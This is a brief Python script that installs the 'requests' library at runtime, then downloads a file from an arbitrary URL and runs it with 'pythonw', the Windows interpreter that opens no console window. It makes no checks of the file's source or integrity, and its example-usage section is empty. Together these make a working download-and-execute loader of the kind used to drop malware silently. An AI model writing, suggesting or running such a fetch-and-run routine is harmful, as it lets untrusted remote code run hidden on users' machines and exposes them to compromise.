import subprocess
import sys

def install_library(library_name):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", library_name])
        print(f"'{library_name}' has been installed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while trying to install '{library_name}': {e}")

# Replace 'requests' with the name of the library you want to install


install_library('requests')



def main(url, filename):
    # Download the file
    import requests
    response = requests.get(url)
    if response.status_code == 200:
        with open(filename, 'wb') as file:
            file.write(response.content)
        print(f"Downloaded file saved as {filename}")
        
        # Execute the file
        try:
            subprocess.run(['pythonw', filename], check=True)
            print(f"Execution of {filename} was successful.")
        except subprocess.CalledProcessError as e:
            print(f"Error during execution: {e}")
    else:
        print(f"Failed to download file. Status code: {response.status_code}")

# Example usage
